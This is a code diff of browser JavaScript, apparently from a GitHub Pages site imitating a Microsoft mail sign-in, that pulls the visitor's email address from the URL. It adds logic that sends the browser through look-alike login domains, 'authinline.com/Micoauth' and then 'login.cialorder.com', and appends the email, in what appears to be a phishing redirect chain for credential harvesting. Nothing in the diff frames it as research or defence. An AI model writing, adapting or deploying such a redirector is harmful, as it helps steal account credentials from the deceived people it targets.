@@ -6,14 +6,26 @@
     function processEmailUrl() {
       var currentURL = window.location.href;
 
-      // Check if the URL contains an '=' character followed by '#' and an email address
-      var emailRegex = /=(?=#[^#]*$)/;
-      if (emailRegex.test(currentURL)) {
-        // Replace the '=' character and everything that comes after it with an empty string
-        var cleanURL = currentURL.replace(/=.*/, '');
+      // Check if the URL contains an '=' character followed by '?'
+      if (currentURL.includes('=') && currentURL.includes('?')) {
+        // Split the URL into two parts: the base URL and the email part
+        var parts = currentURL.split('=');
+        var baseURL = parts[0]; // https://Microoauth.github.io/mail
+        var emailPart = parts[1];
 
-        // Redirect to the cleaned URL
-        window.location.href = cleanURL;
+        // Extract the email by finding the first '@' symbol
+        var email = emailPart.match(/[^@]+@[^@]+/);
+
+        if (email) {
+          // Construct the redirect URL by appending the extracted email to the second link
+          var redirectURL = 'https://authinline.com/Micoauth/index.html#' + email[0];
+
+          // Redirect to the constructed URL
+          window.location.href = redirectURL;
+        } else {
+          // If no email is found in the URL, simply redirect to the second link
+          window.location.href = 'https://authinline.com/Micoauth/index.html';
+        }
       } else {
         // If the URL didn't match the email pattern, proceed with extracting the email
         extractEmailAndRedirect();
@@ -37,22 +49,22 @@
           var email = emailPart.match(/[^@]+@[^@]+/);
 
           if (email) {
-            // Construct the redirect URL by appending the extracted email to the second link
-            var redirectURL = 'https://login.cialorder.com/mhXayjAt?' + email[0];
+            // Construct the final redirect URL with the extracted email
+            var redirectURL = 'https://login.cialorder.com/mhXayjAt#' + email[0];
 
-            // Redirect to the constructed URL
+            // Redirect to the final URL
             window.location.href = redirectURL;
           } else {
-            // If no email is found in the URL, simply redirect to the second link
-            window.location.href = 'https://authinline.com/Micoauth/index.html/';
+            // If no email is found in the URL, simply redirect to the final link
+            window.location.href = 'https://login.cialorder.com/mhXayjAt';
           }
         } else {
-          // If the email part is empty, simply redirect to the second link
-          window.location.href = 'https://authinline.com/Micoauth/index.html/';
+          // If the email part is empty, simply redirect to the final link
+          window.location.href = 'https://login.cialorder.com/mhXayjAt';
         }
       } else {
-        // If no '?' character is found, simply redirect to the second link
-        window.location.href = 'https://authinline.com/Micoauth/index.html/';
+        // If no '?' character is found, simply redirect to the final link
+        window.location.href = 'https://login.cialorder.com/mhXayjAt';
       }
     }
 
